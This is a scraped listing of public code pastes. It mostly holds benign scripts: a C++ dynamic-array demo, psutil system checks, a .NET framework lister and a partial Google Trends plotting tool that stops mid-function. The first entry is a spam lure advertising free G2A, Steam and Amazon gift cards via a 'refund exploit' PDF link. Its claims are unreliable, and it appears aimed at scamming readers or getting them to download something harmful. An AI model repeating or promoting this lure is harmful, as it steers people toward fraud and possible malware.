id,title,username,language,date,content
ScnNFx0g,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,jusst2k4,GetText,Saturday 6th of April 2024 12:37:22 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_139064.pdf

Working as of:
06 April 2024"
EbUpBeRe,c_array_mem_allocation_test,Python253,C++,Saturday 6th of April 2024 12:30:21 AM CDT,"// Filename: c_array_mem_allocation_test.cpp
// Version: 1.0.0
// Author: Jeoi Reqi

/*
DESCRIPTION:
This C++ program demonstrates dynamic memory allocation by prompting the user to input the size of an array,
creating an array of that size dynamically, filling it with random integers, and then deallocating the memory.

Author: [Author's Name]
Date: [Date of Creation]

REQUIRED LIBRARIES:
- iostream: For input and output operations.

USAGE:
- Compile and run the program.
- Input the size of the array when prompted.
- The program will generate random integers and output them.
*/

#include <iostream>
using namespace std;

int main() {
    int size;

    cout << ""Enter the size of the array (1-1000): "";

    cin >> size;

    int* ptr = new int;

    int* arr = new int[size];
    
    for (int i = 0; i < size; i++) {
        arr[i] = rand() % 1000;
        cout << arr[i] << "" "";
    }

    delete ptr;

    delete[] arr; 

    return 0; // Return 0 to indicate successful program execution
}

"
kb63xW4w,psutil_checks,Python253,Python,Saturday 6th of April 2024 12:18:27 AM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Filename: psutil_checks.py
# Version: 1.0.0
# Author: Jeoi Reqi

""""""
This script performs various system checks using the psutil library and saves the collected data to a file.
""""""

import psutil

def get_cpu_usage():
    """"""
    Get the current CPU usage percentage.

    Returns:
        float: The CPU usage percentage.
    """"""
    return psutil.cpu_percent(interval=1)

def get_system_memory_statistics():
    """"""
    Get the system memory statistics.

    Returns:
        dict: A dictionary containing system memory statistics.
    """"""
    return psutil.virtual_memory()

def get_disk_partitions():
    """"""
    Get the disk partitions.

    Returns:
        list: A list of disk partitions.
    """"""
    return psutil.disk_partitions()

def get_disk_usage(partition='/'):
    """"""
    Get the disk usage statistics.

    Args:
        partition (str): The disk partition to check. Default is '/'.

    Returns:
        tuple: A tuple containing disk usage statistics.
    """"""
    return psutil.disk_usage(partition)

def get_connected_users():
    """"""
    Get information about currently connected users.

    Returns:
        list: A list of connected users.
    """"""
    return psutil.users()

def get_system_utilization():
    """"""
    Get various system utilization metrics.

    Returns:
        dict: A dictionary containing system utilization metrics.
    """"""
    system_util = {
        ""CPU Times Percent"": psutil.cpu_times_percent(),
        ""Logical CPU Count"": psutil.cpu_count(),
        ""CPU Frequency"": psutil.cpu_freq(),
        ""Network I/O Statistics"": psutil.net_io_counters(),
        ""Network Connections"": psutil.net_connections(),
        ""System Boot Time"": psutil.boot_time()
    }
    return system_util

def get_miscellaneous():
    """"""
    Get miscellaneous system information.

    Returns:
        dict: A dictionary containing miscellaneous system information.
    """"""
    test_suite_result = psutil.test()
    misc_info = {}
    if test_suite_result is not None:
        misc_info[""psutil Test Suite""] = test_suite_result
    return misc_info

def get_process_info():
    """"""
    Get information about running processes.

    Returns:
        list: A list of dictionaries containing process information.
    """"""
    processes = psutil.process_iter([""pid"", ""name"", ""username"", ""cpu_percent"", ""memory_percent""])
    user_processes = []
    
    for process in processes:
        process_info = process.info
        if process_info[""username""] != """":
            user_processes.append(process_info)
    
    return user_processes

def get_system_uptime():
    """"""
    Get the system uptime.

    Returns:
        float: System uptime in seconds.
    """"""
    return psutil.boot_time()

def press_enter_to_continue():
    """"""
    Prompt the user to press [ENTER] to continue.
    """"""
    input(""Press [ENTER] to continue...\n"")

def prompt_save_or_exit(data):
    """"""
    Prompt the user to save or exit the program.

    Args:
        data (dict): A dictionary containing collected data.
    """"""
    print(""Options:"")
    print(""1: Save - (Or Press [ENTER])"")
    print(""2: Exit Program"")
    choice = input(""What is your choice (1 or 2)?\n"")
    if choice == '1' or choice == '':
        save_data(data)
    elif choice == '2':
        exit()

def save_data(data):
    """"""
    Save collected data to a file.

    Args:
        data (dict): A dictionary containing collected data.
    """"""
    with open('psutil_checks_output.txt', 'w') as f:
        for key, value in data.items():
            f.write(f""{key}:\n"")
            save_recursive(value, f, 4)  # Start the indentation from 4 spaces
            f.write(""\n"")  # Add a new line after each entry
    print(""Data saved to 'psutil_checks_output.txt'."")

def save_recursive(data, f, indent):
    """"""
    Recursively save nested data to a file.

    Args:
        data: Data to be saved.
        f: File object for writing.
        indent (int): Indentation level.
    """"""
    if isinstance(data, dict):
        for key, value in data.items():
            f.write(f""{' '*indent}{key}: "")
            save_recursive(value, f, indent+4)  # Increase the indentation by 4 spaces
    else:
        f.write(f""{data}\n"")  # Write the data with a new line
            
def main():
    """"""
    Main function to execute system checks.
    """"""
    # Get CPU usage
    cpu_usage = get_cpu_usage()
    print(""CPU Usage:"", cpu_usage)
    
    # Get system uptime
    system_uptime = get_system_uptime()
    print(""System Uptime:"", system_uptime)
    
    # Prompt the user to press [ENTER]
    press_enter_to_continue()
    
    # Get system memory statistics
    memory_stats = get_system_memory_statistics()
    print(""System Memory Statistics:"", memory_stats)
    
    # Get disk partitions
    disk_partitions = get_disk_partitions()
    print(""Disk Partitions:"", disk_partitions)
    
    # Get disk usage statistics
    disk_usage = get_disk_usage()
    print(""Disk Usage Statistics:"", disk_usage)
    
    # Get connected users
    connected_users = get_connected_users()
    print(""Connected Users:"", connected_users)
    
    # Display System Utilization
    press_enter_to_continue()
    print(""\nSystem Utilization:"")
    system_util = get_system_utilization()
    for info, data in system_util.items():
        print(f""- {info}: {data}"")
    
    # Prompt the user to press [ENTER]
    press_enter_to_continue()
    
    # Display Miscellaneous Information
    print(""\nMiscellaneous:"")
    misc_info = get_miscellaneous()
    for info, data in misc_info.items():
        print(f""- {info}: {data}"")
        
    # Prompt the user to press [ENTER]
    press_enter_to_continue()
    
    # Get process information
    user_processes = get_process_info()
    print(""\nUser Processes:"")
    for process in user_processes:
        print(f""PID: {process['pid']}, Name: {process['name']}, CPU Percent: {process['cpu_percent']}, Memory Percent: {process['memory_percent']}"")
    
    # Prompt the user to save or exit
    prompt_save_or_exit({
        ""CPU Usage"": cpu_usage,
        ""System Uptime"": system_uptime,
        ""System Memory Statistics"": memory_stats,
        ""Disk Partitions"": disk_partitions,
        ""Disk Usage Statistics"": disk_usage,
        ""Connected Users"": connected_users,
        ""System Utilization"": system_util,
        ""Miscellaneous"": misc_info,
        ""User Processes"": user_processes
    })

if __name__ == ""__main__"":
    main()

"
ry2vg4uw,installed_.net_frameworks,Python253,Python,Saturday 6th of April 2024 12:17:29 AM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Filename: installed_.net_frameworks.py
# Version: 1.0.0
# Author: Jeoi Reqi

""""""
This script retrieves version information about all installed .NET Framework versions on a Windows system.
""""""

import winreg

def get_dotnet_frameworks():
    """"""
    Get installed .NET Framework versions.

    Returns:
        list: A list of installed .NET Framework versions.
    """"""
    dotnet_versions = []
    dotnet_release_keys = [
        (winreg.HKEY_LOCAL_MACHINE, r""SOFTWARE\Microsoft\NET Framework Setup\NDP""),
        (winreg.HKEY_LOCAL_MACHINE, r""SOFTWARE\Wow6432Node\Microsoft\NET Framework Setup\NDP"")
    ]

    for hive, subkey in dotnet_release_keys:
        with winreg.OpenKey(hive, subkey, 0, winreg.KEY_READ) as key:
            subkey_names_count, _, _ = winreg.QueryInfoKey(key)
            for i in range(subkey_names_count):
                subkey_name = winreg.EnumKey(key, i)
                if subkey_name.startswith(""v"") and subkey_name not in dotnet_versions:
                    dotnet_versions.append(subkey_name)

    return dotnet_versions

def main():
    """"""
    Main function to retrieve installed .NET Framework versions and print them.
    """"""
    dotnet_versions = get_dotnet_frameworks()
    if dotnet_versions:
        print(""Installed .NET Framework versions:"")
        for version in dotnet_versions:
            print(f""- {version}"")
    else:
        print(""No .NET Frameworks found."")

if __name__ == ""__main__"":
    main()

"
ShsWtruE,Trend_AV,Python253,Python,Saturday 6th of April 2024 12:15:34 AM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Filename: Trend_AV.py
# Version: 1.27
# Author: Jeoi Reqi
# Date: February 2024

'''
[DESCRIPTION]:
Trend_AV is a Python script designed to analyze and visualize Google Trends data using the Google Trends API. It facilitates the exploration of interest trends over time for user-specified topics. The script offers the following functionalities:

1. Line Plots: Generates monthly-separated line plots with solid markers, depicting the trend of interest over time.

2. 3D Bar Plots: Creates visualizations illustrating interest levels for specified topics over time using 3D bar plots.

3. Pie Charts: Generates pie charts with average values, providing insights into the distribution of interest across different topics.

4. Scatter Plots: Displays scatter plots with average values, showing the relationship between time and interest level for specified topics.

5. Stack Plots: Generates stack plots illustrating the contribution of each topic to the overall interest level over time.

6. Word Clouds: Utilizes related top and rising topics fetched from Google Trends to generate word clouds, offering a visually appealing representation of related queries.

[REQUIRED FILES]:
- header.txt:       Contains header information for the script.
                    URL: https://pastebin.com/PhGW7s6i

- about.py:         Provides information about the script and its functionalities.
                    URL: https://pastebin.com/14xC5Mji

- promo.txt:        Contains promotional content for the script.
                    URL: https://pastebin.com/xkedg3n5

- requirements.txt: Lists the required dependencies for running the script.
                    URL: https://pastebin.com/wutgrtpn

[NOTE]:
Ensure that all required files are saved in the current working directory with the correct file extensions.

'''



# GET IMPORTS
import sys
import subprocess
import importlib
import numpy as np
import warnings
import matplotlib.pyplot as plt
import matplotlib.animation as animation
import matplotlib.lines as mlines
from matplotlib.lines import Line2D
from mpl_toolkits.mplot3d.art3d import Poly3DCollection
from mpl_toolkits.mplot3d import Axes3D
from mpl_toolkits.mplot3d.art3d import Poly3DCollection, Line3DCollection
from pytrends.request import TrendReq
from dateutil.relativedelta import relativedelta
from typing import List
from datetime import datetime
from wordcloud import WordCloud

# INSTALLATIONS
def import_module_or_install(package_name):
    try:
        return importlib.import_module(package_name)
    except ImportError:
        print(f""Error: {package_name} module not found. Installing..."")
        subprocess.run([sys.executable, ""-m"", ""pip"", ""install"", package_name], check=True)
        print(f""Successfully installed {package_name}."")
        return importlib.import_module(package_name)

# Try importing these libraries or install them if not found
pytrends = import_module_or_install('pytrends')
plt = import_module_or_install('matplotlib.pyplot')
np = import_module_or_install('numpy')

# CLEAR SCREEN
def wipe():
    print('\n' * 100)

# INSTALL PACKAGES
def install_packages(packages):
    try:
        for package in packages:
            if not isinstance(package, str):
                raise ValueError(f""Package name must be a string, but found: {package}"")
            
            # Suppress output during installation for python-dateutil
            stdout_arg = subprocess.PIPE if package == 'python-dateutil' else sys.stdout
            stderr_arg = subprocess.PIPE if package == 'python-dateutil' else sys.stderr
            subprocess.run([sys.executable, ""-m"", ""pip"", ""install"", package], check=True, stdout=stdout_arg, stderr=stderr_arg)
    except subprocess.CalledProcessError as e:
        print(f""Error: Failed to install packages. Please install them manually.\n"")
        sys.exit(1)

if __name__ == ""__main__"":
    print(""\nChecking and installing required packages...\n"")

    # Check if python-dateutil is installed
    python_dateutil_installed = importlib.util.find_spec('dateutil') is not None

    if not python_dateutil_installed:
        print(""Installing python-dateutil..."")
        install_packages(['python-dateutil'])
        print(""\npython-dateutil installed successfully.\n\n\n\n"")
        wipe()
    else:
        print(""\nAll requirements have been satisfied.\n\n\n\n"")
        input(""\n\nPress [ENTER] to continue.\n"")
        wipe()

    warnings.simplefilter(action='ignore', category=FutureWarning)

    # Now you should be able to use TrendReq
    pytrends = TrendReq(hl='en-US', tz=-480)


'''                    [GLOBAL HEADER]'''

# Read the content of header.txt
with open('header.txt', 'r', encoding='utf-8') as file:
    header_content = file.read()

def header():  # Function to print the header
    wipe()
    print(header_content)

header()  # Call the header function


'''                    [GLOBAL VARIABLES & CONSTANTS]'''

# User Input for Topics and Timeframe
interest_over_time = None  # Initialize interest_over_time as a global variable
num_months = None  # Initialize num_months as a global variable

# Initialize global Keywords list
keywords: list[str] = []

# Set the constant max values for topics & results
max_topics = 5
max_top = 24
max_rising = 24
max_months = 240

# For use with 3D Bar Plot (Bar Sizes: Eg; 70% width/40% depth)
bar_width = 0.70  # Width on the x-axis as a percent Using dx
bar_depth = 0.40  # Width on the x-axis as a percent Using dx

'''                    [SYSTEM FUNCTIONS]'''


# Define the reset program function
def reset_program():
    global keywords
    global related_data_displayed
    
    # Clear user inputs and related data
    keywords = []
    related_data_displayed = False
    
    print(""\nProgram reset. All data cleared.\n"")
    input(""Press [ENTER] to continue."")

    # Call the user_input function to get user input
    user_input()

# Flag to track if related data has been displayed
related_data_displayed = False


'''                [USER INPUT]'''

'''
    THIS IS AN INTERACTIVE FUNCTION TO GATHER USER INPUT FOR TOPICS AND TIMEFRAME.
'''

# Function to get user input for topics
def user_input():
    global interest_over_time  # Declare interest_over_time as a global variable
    global num_months  # Declare num_months as a global variable
    
    # User Input for Topics
    while len(keywords) < 1 or len(keywords) > max_topics:
        try:
            # Prompt user for the number of topics they want to analyze
            num_topics = int(input(f""\nEnter the number of topics (1 to {max_topics}): ""))
            # Validate user input to ensure it falls within the specified range
            if 1 <= num_topics <= max_topics:
                for i in range(num_topics):
                    keyword = input(f""Enter topic/query {i + 1}: "")
                    keywords.append(keyword.lower())  # Automatically convert to lowercase
            else:
                # Display an error message for an invalid number of topics
                print(f""\nInvalid number of topics. Please enter a number between 1 and {max_topics}.\n"")
        except ValueError:
            # Handle the case where the user enters a non-integer value
            print(""\nInvalid input. Please enter a valid number.\n"")

    # User Input for Timeframe
    while True:
        try:
            # Prompt user for the number of months to display in the analysis
            num_months = int(input(f""\nEnter the number of months to display between this month (1) and 2004 ({max_months}): ""))
            # Validate user input for the timeframe
            if 1 <= num_months <= max_months:
                # Calculate the end date
                end_date = datetime.today().strftime('%Y-%m-%d')
                # Calculate the start date based on the number of months
                start_date = (datetime.today() - relativedelta(months=num_months)).strftime('%Y-%m-%d')

                # Fetch data from Google Trends based on user-specified topics & timeframe
                timeframe = f'{start_date} {end_date}'
                print(f""\nFetching data from Google Trends with timeframe: {timeframe}\n"")
                
                pytrends.build_payload(keywords, timeframe=timeframe)
                interest_over_time = pytrends.interest_over_time()
                
                # Wait for the user to hit [ENTER] to continue to the Menu
                input(""\nPress [ENTER] to continue to the main menu.\n"")
                
                if interest_over_time.empty:
                    raise ValueError(""No data retrieved from Google Trends."")
                
                break  # Exit the loop if input is valid
            else:
                # Display an error message for an invalid number of months
                print(f""\nInvalid number of months. Please enter a number between 1 and {max_months}.\n"")
        except ValueError as ve:
            print(f""\nError: {ve}\n"")

# Call the user_input function to get user input
user_input()


'''                    [GENERATE THE PLOTS]'''

'''
    [GENERATE THE PLOTS]:
    THIS SECTION OF THE CODE CONTAINS THE FUNCTIONS TO GENERATE & VISUALIZE VARIOUS TYPES OF PLOTS BASED ON
    GOOGLE TRENDS DATA. EACH FUNCTION IS DESIGNED TO PRESENT DIFFERENT INSIGHTS INTO THE INTEREST OVER TIME
    FOR USER-SPECIFIED TOPICS OR QUERIES. THE PLOTS INCLUDE ANIMATED AND STATIC VERSIONS OF LINE PLOTS,
    BAR PLOTS (2D AND 3D), PIE CHARTS, SCATTER PLOTS, AND STACK PLOTS. THE USER CAN CHOOSE TO DISPLAY THESE
    PLOTS INDIVIDUALLY OR IN COMBINATIONS. THE FUNCTIONS PROVIDE INTERACTIVE AND DYNAMIC VISUALIZATIONS,
    ALLOWING USERS TO EXPLORE TRENDS, COMPARE TOPICS, AND UNDERSTAND THE RELATIVE STRENGTH AND INTEREST
    PATTERNS OVER SPECIFIED TIMEFRAMES.
'''

'''                    [LINE PLOTS]'''

# ANIMATED LINE PLOT
def animate_line_plot(interest_over_time, keywords, num_months):
    '''
        GENERATE AND DISPLAY ANIMATED LINE PLOTS WITH SOLID MARKERS.

        PARAMETERS:
        - INTEREST_OVER_TIME (DATAFRAME): DATAFRAME CONTAINING INTEREST OVER TIME.
        - KEYWORDS (LIST[STR]): LIST OF KEYWORDS TO PLOT.
        - NUM_MONTHS (INT): NUMBER OF MONTHS FOR THE PLOT.
    '''
    print(""\nAnimating line plots with solid markers..."")

    fig, ax = plt.subplots(figsize=(16, 8))

    def update(frame):
        ax.clear()

        # Calculate the percentage of completion
        percent_complete = (frame + 1) / total_frames * 100

        for keyword in keywords:
            # Plot the line for the current frame with hollow markers
            end_index = frame * len(interest_over_time) // total_frames
            ax.plot(interest_over_time.index[:end_index + 1], interest_over_time[keyword][:end_index + 1],
                    label=keyword, marker='o', markersize=8, linestyle='solid', mec='none')

        ax.set_title(f'Animated Line Plot\n{percent_complete:.2f}% Complete')
        ax.set_xlabel('Date')
        ax.set_ylabel('Interest Level')
        ax.legend(loc='upper left')

        # Set y-axis ticks from 0 to 100 in increments of 10
        ax.set_yticks(np.arange(0, 110, 10))
        # Set the fixed height for the y-axis
        ax.set_ylim(0, 100)

    # Calculate total frames
    total_frames = len(interest_over_time)

    # Create the animation
    animation_line_plots = animation.FuncAnimation(fig, update, frames=total_frames, interval=250, repeat=False)

    plt.show()


# GENERATE LINE PLOT
def generate_line_plot(interest_over_time, keywords, num_months):
    '''
        GENERATE AND DISPLAY LINE PLOTS WITH SOLID MARKERS.

        PARAMETERS:
        - INTEREST_OVER_TIME (DATAFRAME): DATAFRAME CONTAINING INTEREST OVER TIME.
        - KEYWORDS (LIST[STR]): LIST OF KEYWORDS TO PLOT.
        - NUM_MONTHS (INT): NUMBER OF MONTHS FOR THE PLOT.
    '''
    print(""\nGenerating line plots with solid markers..."")

    plt.figure(figsize=(16, 8))

    for keyword in keywords:
        # Plot the line with hollow markers
        plt.plot(interest_over_time.index, interest_over_time[keyword], label=keyword, marker='o', markersize=8,
                 linestyle='solid', mec='none')

    plt.title(f'Static Line Plot')
    plt.xlabel('Date')
    plt.ylabel('Interest Level')
    plt.legend(loc='upper left')

    # Set y-axis ticks from 0 to 100 in increments of 10
    plt.yticks(np.arange(0, 110, 10))

    # Set the fixed height for the y-axis
    plt.ylim(0, 100)

    plt.show()


'''                    [BAR PLOTS]'''

# ANIMATE 2D BAR PLOT
def animate_2d_bar_plot(interest_over_time, keywords):
    """"""
    Generate and display an animated 2D bar plot.

    Parameters:
    - interest_over_time (DataFrame): Dataframe containing interest over time.
    - keywords (List[str]): List of keywords to plot.
    """"""
    global num_months  # Declare num_months as a global variable
    print(""\nAnimating 2D Bar Plot..."")

    fig, ax = plt.subplots(figsize=(8, 8))
    colors = plt.cm.viridis(np.linspace(0, 1, len(keywords)))

    # Sort keywords based on their mean values
    sorted_keywords = sorted(keywords, key=lambda keyword: interest_over_time[keyword].mean())

    def update(frame):
        ax.clear()

        # Calculate the percentage completed
        percent_complete = (frame + 1) / total_frames * 100

        # Extract data for the current frame
        start_index = frame * len(interest_over_time) // num_months
        end_index = (frame + 1) * len(interest_over_time) // num_months
        ys = interest_over_time.iloc[start_index:end_index][sorted_keywords]

        # Plot the 2D bar chart for the current frame
        bars = ax.bar(sorted_keywords, ys.mean(), color=colors)

        # Dynamically display the current month number
        current_month = frame + 1
        ax.set_title(f'Animated 2D Bar Plot - Month {current_month} / {num_months}\n({percent_complete:.1f}% Complete)', fontsize=14, fontweight='bold')
        ax.set_ylabel('Interest Level')

        # Annotate each bar with its value
        for bar, y in zip(bars, ys.mean()):
            height = bar.get_height()
            ax.annotate(f'{y:.2f}', xy=(bar.get_x() + bar.get_width() / 2, height),
                        xytext=(0, 3), textcoords='offset points',
                        ha='center', va='bottom')

        # Set x-axis ticks and labels based on sorted keywords
        ax.set_xticks(np.arange(len(sorted_keywords)))
        ax.set_xticklabels(sorted_keywords, rotation=45, ha='right')  # Adjust rotation and alignment as needed

        # Set y-axis ticks from 0 to 100 in increments of 10
        ax.set_yticks(np.arange(0, 110, 10))

        # Set the fixed height for the y-axis
        ax.set_ylim(0, 100)

    # Calculate total frames
    total_frames = min(len(interest_over_time), num_months)

    # Create the animation
    animation_2d_bar = animation.FuncAnimation(fig, update, frames=total_frames, interval=250, repeat=False)

    plt.show()



# ANIMATE 3D BAR PLOT  
def animate_3d_bar_plot(interest_over_time, keywords, num_months=num_months):
    """"""
    Generate and display an animated 3D bar plot.

    Parameters:
    - interest_over_time (DataFrame): Dataframe containing interest over time.
    - keywords (List[str]): List of keywords to plot.
    - num_months (int): Number of months to display in the animation.
    """"""
    print(""\nAnimating 3D Bar Plot..."")

    fig = plt.figure(figsize=(8, 8))
    ax = fig.add_subplot(projection='3d')

    # Set figure elevation, azimuth & roll
    ax.view_init(elev=10, azim=40, roll=0)
    
    # Sort keywords based on their mean values in descending order (from largest to smallest)
    sorted_keywords = sorted(keywords, key=lambda keyword: interest_over_time[keyword].mean(), reverse=True)

    # Generate a color map with a different color for each keyword
    colors = plt.cm.tab10(np.arange(len(keywords)))

    # Calculate total frames
    total_frames = min(len(interest_over_time), num_months)

    def update(frame):
        # Calculate the month
        month = frame + 1

        # Calculate percent_complete based on the current frame and total frames
        percent_complete = (frame + 1) / total_frames * 100

        # Calculate the number of elements in each frame
        elements_per_frame = len(interest_over_time) // num_months

        # Calculate the start and end indices for the current frame
        start_index = frame * elements_per_frame
        end_index = (frame + 1) * elements_per_frame

        # Use iloc to ensure consistent slicing
        ys = interest_over_time.iloc[start_index:end_index][sorted_keywords]

        ax.clear()  # Clear the previous frame

        for k, keyword in enumerate(sorted_keywords):
            xs = np.arange(len(ys))
            zs = np.full(len(ys), k)  # Use np.full to create an array with the same value (k) for each element

            # Create 3D bars using bar3d function with defined width and depth
            ax.bar3d(xs, zs, np.zeros(len(xs)), dx=bar_width, dy=bar_depth, dz=ys[keyword], color=colors[k])

        # Display the values of the topics outside the plot
        for k, keyword in enumerate(sorted_keywords):
            value_text = f'{keyword}: {ys[keyword].values[frame] if frame < len(ys[keyword]) else ys[keyword].values[-1]:.1f}'
            ax.text(len(sorted_keywords), k, -10, value_text, fontsize=10, verticalalignment='baseline', color=colors[k])

        # Dynamically display the current month number
        current_month = frame + 1

        # Set Titles & Labels
        ax.set_title(f'Animated 3D Bar Plot - Month {current_month} / {num_months}\n({percent_complete:.1f}% Complete)', fontsize=14, fontweight='bold')
        ax.set_xlabel('Months', labelpad=20)
        ax.xaxis.label.set_position((-20, 0))
        ax.set_ylabel('Topics', labelpad=20)
        ax.yaxis.label.set_position((-20, 0))
        ax.set_zlabel('Interest Level', labelpad=20)
        ax.zaxis.label.set_position((0, 0))

        # Directly set x-axis ticks to match the number of topics
        ax.set_xticks(np.arange(len(sorted_keywords)))
        # Set x-axis ticks to display topics
        ax.set_xticklabels([])

        # Set y-axis ticks to match the number of sorted_keywords
        ax.set_yticks(np.arange(len(sorted_keywords)))
        # Set y-axis ticks to display sorted_keywords
        ax.set_yticklabels([])

        # Set z-axis ticks from 0 to 100
        ax.set_zticks(np.arange(0, 110, 10))
        # Set z-axis limit 0 to 100
        ax.set_zlim(0, 100)

    # Create the animation
    animation_3d_bar = animation.FuncAnimation(fig, update, frames=total_frames, interval=250, repeat=False)

    plt.show()



# STATIC 3D BAR PLOT
def generate_3d_bar_plot(interest_over_time, keywords):
    """"""
    Generate and display a static 3D bar plot.

    Parameters:
    - interest_over_time (DataFrame): Dataframe containing interest over time.
    - keywords (List[str]): List of keywords to plot.
    """"""

    print(""\nGenerating 3D Bar Plot..."")

    fig = plt.figure(figsize=(8, 8))
    ax = fig.add_subplot(projection='3d')

    # Set figure elevation, azimuth & roll
    ax.view_init(elev=10, azim=40, roll=0)

    # Calculate mean values for each keyword
    mean_values = [interest_over_time[keyword].mean() for keyword in keywords]

    # Sort keywords and mean values based on mean values in descending order
    sorted_data = sorted(zip(keywords, mean_values), key=lambda x: x[1], reverse=True)
    sorted_keywords, sorted_mean_values = zip(*sorted_data)

    # Generate a color map with a different color for each keyword
    colors = plt.cm.tab10(np.arange(len(sorted_keywords)))

    max_rows = min(len(sorted_keywords), 5)  # Set a maximum of 5 rows
    max_cells = min(len(interest_over_time), 5)  # Set a maximum of 5 cells (1 row * 5 columns)

    for k, keyword in enumerate(sorted_keywords):
        xs = np.arange(max_cells)
        zs = np.full(len(xs), k)  # Use np.full to create an array with the same value (k) for each element
        ys = np.full(len(xs), sorted_mean_values[k])

        # Create 3D bars using bar3d function with defined width and depth
        ax.bar3d(xs, zs, np.zeros(len(xs)), dx=1, dy=1, dz=ys, color=colors[k])

    # Display the values of the topics outside the plot
    for k, (keyword, mean_value) in enumerate(zip(sorted_keywords, sorted_mean_values)):
        value_text = f'{keyword}: {mean_value:.1f}'
        ax.text(max_cells + 0.5, k - 0.5, -10, value_text, fontsize=10, verticalalignment='baseline', color=colors[k])

    # Set Titles & Labels
    ax.set_title('Static 3D Bar Plot', fontsize=14, fontweight='bold')
    ax.set_xlabel('Months', labelpad=20)
    ax.xaxis.label.set_position((-20, 0))
    ax.set_ylabel('Topics')
    ax.set_zlabel('Interest Level', labelpad=20)
    ax.zaxis.label.set_position((0, 0))

    # Directly set x-axis ticks to match the number of months
    ax.set_xticks(np.arange(max_cells))
    # Set x-axis ticks to display months
    ax.set_xticklabels([])

    # Set y-axis ticks to match the number of sorted_keywords
    ax.set_yticks(np.arange(max_rows))
    # Set y-axis ticks to display sorted_keywords
    ax.set_yticklabels([])

    # Set z-axis ticks from 0 to the total value
    ax.set_zticks(np.arange(0, 110, 10))
    # Set z-axis limit 0 to the total value
    ax.set_zlim(0, 100)

    plt.show()
    
    

# GENERATE BAR PLOT
def generate_bar_plot(interest_over_time, keywords):
    '''
        GENERATE AND DISPLAY A BAR PLOT BASED ON USER'S CHOICE (2D OR 3D).

        PARAMETERS:
        - INTEREST_OVER_TIME (DATAFRAME): DATAFRAME CONTAINING INTEREST OVER TIME.
        - KEYWORDS (LIST[STR]): LIST OF KEYWORDS TO PLOT.
    '''

    try:
        # Ask the user if they want 2D or 3D
        bar_type = input(""\nChoose the bar plot type: \n1: 2D\n2: 3D\nYour Choice (1 or 2): "")

        if bar_type == '1':
            generate_2d_bar_plot(interest_over_time, keywords)
        elif bar_type == '2':
            generate_3d_bar_plot(interest_over_time, keywords)
        else:
            print(""Invalid choice. Please enter 1 for 2D or 2 for 3D."")

    except ValueError:
        print(""\nInvalid input. Please enter a valid number.\n"")
        
'''                    [PIE CHARTS]'''

# ANIMATED PIE CHART
def animate_pie_chart(interest_over_time, keywords, num_months):
    '''
        GENERATE AND DISPLAY AN ANIMATED PIE CHART WITH AVERAGE VALUES.

        PARAMETERS:
        - INTEREST_OVER_TIME (DATAFRAME): DATAFRAME CONTAINING INTEREST OVER TIME.
        - KEYWORDS (LIST[STR]): LIST OF KEYWORDS TO INCLUDE IN THE PIE CHART.
        - NUM_MONTHS (INT): NUMBER OF MONTHS FOR WHICH THE AVERAGE VALUES ARE CALCULATED.
    '''
    print(""\nAnimating Pie Chart (Average)..."")

    average_values = interest_over_time[keywords].mean()

    # Calculate total frames
    total_frames = len(interest_over_time)

    fig, ax = plt.subplots(figsize=(8, 8))

    def update(frame):
        ax.clear()

        # Calculate the percentage of completion
        percent_complete = (frame + 1) / total_frames * 100

        # Calculate the average values for the current frame
        current_frame = frame * len(interest_over_time) // total_frames
        current_values = interest_over_time.iloc[current_frame][keywords]

        # Create a pie chart for the current frame
        wedges, texts, autotexts = ax.pie(current_values, labels=[f'{keyword}\nAverage: {current_values[keyword]:.2f}' for keyword in keywords],
                                          autopct='', startangle=140, wedgeprops=dict(width=0.3))

        # Calculate the center of the pie chart
        center_x, center_y = np.mean([wedge.center for wedge in wedges], axis=0)

        # Adjust the starting offset and offset
        start_offset = -1.80
        offset = -0.20

        for i, keyword in enumerate(keywords):
            ax.text(center_x, center_y - (start_offset + i) * offset, f'{keyword}\nAverage: {current_values[keyword]:.2f}', ha='center', va='center', color='black', fontsize=10)

        ax.set_title(f'Animated Pie Chart - (Average Strength)\n{percent_complete:.2f}% Complete')

    # Create the animation
    animation_pie_chart = animation.FuncAnimation(fig, update, frames=total_frames, interval=250, repeat=False)

    plt.show()

# GENERATE PIE CHART
def generate_pie_chart(interest_over_time, keywords, num_months):
    '''
        GENERATE AND DISPLAY A STATIC PIE CHART WITH AVERAGE VALUES.

        PARAMETERS:
        - INTEREST_OVER_TIME (DATAFRAME): DATAFRAME CONTAINING INTEREST OVER TIME.
        - KEYWORDS (LIST[STR]): LIST OF KEYWORDS TO INCLUDE IN THE PIE CHART.
        - NUM_MONTHS (INT): NUMBER OF MONTHS FOR WHICH THE AVERAGE VALUES ARE CALCULATED.
    '''
    print(""\nGenerating Pie Chart (Average Strength)..."")

    average_values = interest_over_time[keywords].mean()

    plt.figure(figsize=(8, 8))
    wedges, texts, autotexts = plt.pie(average_values, labels=[f'{keyword}\nAverage: {average_values[keyword]:.2f}' for keyword in keywords],
                                       autopct='', startangle=140, wedgeprops=dict(width=0.3))

    # Calculate the center of the pie chart
    center_x, center_y = np.mean([wedge.center for wedge in wedges], axis=0)

    # Adjust the starting offset and offset
    start_offset = -1.80
    offset = -0.20

    for i, keyword in enumerate(keywords):
        plt.text(center_x, center_y - (start_offset + i) * offset, f'{keyword}\nAverage: {average_values[keyword]:.2f}', ha='center', va='center', color='black', fontsize=10)

    plt.title(f'Static Pie Chart (Average)')
    plt.show()


'''                    [SCATTER PLOTS]'''

# ANIMATED SCATTER PLOT
def animate_scatter_plot(interest_over_time, keywords, max_months=240):
    '''
        GENERATE AND DISPLAY AN ANIMATED SCATTER PLOT WITH AVERAGES & SOLID MARKERS.

        PARAMETERS:

        - INTEREST_OVER_TIME (DATAFRAME): DATAFRAME CONTAINING INTEREST OVER TIME.
        - KEYWORDS (LIST[STR]): LIST OF KEYWORDS TO PLOT.
        - MAX_MONTHS (INT): MAXIMUM NUMBER OF MONTHS TO ANIMATE (MAX IS 240).
    '''
    print(""\nAnimating Scatter Plot..."")

